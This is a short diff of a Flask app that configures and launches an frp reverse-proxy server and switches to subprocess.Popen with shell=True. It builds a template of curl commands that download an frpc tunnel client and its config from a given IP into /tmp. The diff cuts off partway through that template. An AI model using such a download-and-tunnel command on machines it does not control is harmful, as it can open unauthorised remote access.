@@ -5,6 +5,7 @@ import sys
 import logging
 import os
 import re
+import subprocess
 
 app = Flask(__name__)
 
@@ -44,7 +45,7 @@ def root():
     replace(CACHE_PATH + FRPCNAME, CACHE_PATH + FRPCNAME, "{{frpsport}}", str(FRPSPORT))
     replace(RESOURCE_PATH + "frps.ini", CACHE_PATH + FRPSNAME, "{{frpsport}}", str(FRPSPORT))
 
-    os.popen(RESOURCE_PATH + "frps -c " + CACHE_PATH + FRPSNAME + " &")
+    subprocess.Popen(RESOURCE_PATH + "frps -c " + CACHE_PATH + FRPSNAME + " &", shell=True)
 
     code = '''curl http://{IP}:{PORT}/frpc -o /tmp/frpc && 
     curl http://{IP}:{PORT}/frpcini -o /tmp/frpc.ini && 
